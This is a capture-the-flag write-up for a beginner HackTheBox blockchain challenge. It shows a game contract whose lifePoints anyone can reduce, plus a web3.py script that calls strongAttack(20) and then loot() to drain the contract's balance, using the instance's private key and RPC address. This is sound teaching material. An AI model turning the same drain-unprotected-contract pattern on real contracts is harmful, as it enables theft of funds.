# Survival of the Fittest — HackTheBox Blockchain Challenge Writeup

**Challenge**: Survival of the Fittest  
**Difficulty**: Very Easy  
**Category**: Blockchain  

---

## Challenge Description

> Alex had always dreamed of becoming a warrior, but she wasn't particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster.

This is a beginner-friendly blockchain challenge where you need to defeat a monster and claim its loot.

---

## Initial Reconnaissance

After spawning the instance, I got the connection details:
- RPC URL
- Private key
- Target contract address

First thing I did was check what contracts were provided. There were two main files:

### Setup.sol
```solidity
contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }
    
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

This told me the win condition: drain the Creature contract's balance to 0.

### Creature.sol
```solidity
contract Creature {
    
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
    
    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}
```

---

## Analyzing the Vulnerability

Looking at the `Creature` contract, I noticed something interesting in the `_dealDamage` function:

```solidity
function _dealDamage(uint256 _damage) internal {
    aggro = msg.sender;
    lifePoints -= _damage;
}
```

Wait... there's no check here! The function just does `lifePoints -= _damage` without checking if `_damage` is valid or if `lifePoints` would go negative.

At first, I thought this might be an integer underflow vulnerability, but then I remembered this contract uses Solidity 0.8.13:

```solidity
pragma solidity ^0.8.13;
```

Solidity 0.8+ has built-in overflow/underflow protection, so if I tried to pass a damage value greater than `lifePoints`, the transaction would revert.

### The "Vulnerability"

Actually, this isn't really a vulnerability at all. It's just... straightforward game logic. The creature starts with 20 HP, and I can call `strongAttack` with any damage value up to 20. There's no access control preventing me from attacking.

So the solution is simple:
1. Call `strongAttack(20)` to reduce lifePoints to 0
2. Call `loot()` to claim the contract's balance

The "trick" (if you can call it that) is realizing you don't need to call `punch()` 20 times. You can just deal all the damage at once with `strongAttack(20)`.

---

## Exploitation

I wrote a Python script using web3.py to interact with the contract:

```python
from web3 import Web3

# connection info from HTB instance
RPC_URL = "http://94.237.123.119:37206/rpc"
PRIVATE_KEY = "0xc2751272b51463a92dda61b482e7b701859573e6dab3fef758bbf72afdb5339c"
TARGET_ADDRESS = "0x2837b3F4bb0027C4920E69d8f13EB5F0e1B29916"

# minimal ABI for the functions we need
CREATURE_ABI = [
    {
        "inputs": [],
        "name": "lifePoints",
        "outputs": [{"type": "uint256"}],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{"name": "_damage", "type": "uint256"}],
        "name": "strongAttack",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "loot",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]
```

### Step 1: Connect and Check State

```python
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVATE_KEY)
creature = w3.eth.contract(address=TARGET_ADDRESS, abi=CREATURE_ABI)

life = creature.functions.lifePoints().call()
bal = w3.eth.get_balance(TARGET_ADDRESS)
print(f"Creature HP: {life}")  # Output: 20
print(f"Contract balance: {bal} wei")  # Output: 10 wei
```

### Step 2: Attack the Creature

```python
tx = creature.functions.strongAttack(20).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})

signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
```

After this transaction, `lifePoints` becomes 0.

### Step 3: Loot the Creature

```python
tx = creature.functions.loot().build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})

signed = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
```

The `loot()` function transfers the entire balance to my address since `lifePoints == 0`.

---

## Running the Solution

```bash
python solve.py
```

Output:
```
Connected to RPC
Creature HP: 20
Contract balance: 10 wei

Attacking...
Attack successful: 0x...

Creature HP now: 0

Looting...
Loot successful: 0x...

Final contract balance: 0 wei
Challenge solved!
```

Flag obtained! 🎉

---

## Key Takeaways

1. **Read the code carefully**: The solution was straightforward once I understood what the contract actually does.

2. **Understand Solidity versions**: Knowing that 0.8+ has overflow protection saved me from going down the wrong path.

3. **Check win conditions**: The `isSolved()` function in Setup.sol clearly tells you what needs to happen.

4. **Use proper tooling**: web3.py made it easy to interact with the contract programmatically.

This was a great introductory challenge for the HackTheBox Blockchain track. It teaches the basics of:
- Connecting to an Ethereum RPC endpoint
- Reading contract state
- Signing and sending transactions
- Understanding basic Solidity logic

---

## Resources

- [Solidity Documentation](https://docs.soliditylang.org/)
- [web3.py Documentation](https://web3py.readthedocs.io/)
- [HackTheBox Platform](https://www.hackthebox.com/)

**Challenge Rating**: ⭐⭐☆☆☆ (Very Easy - Great for beginners!)

---

*If you found this writeup helpful, feel free to check out my other CTF solutions!*
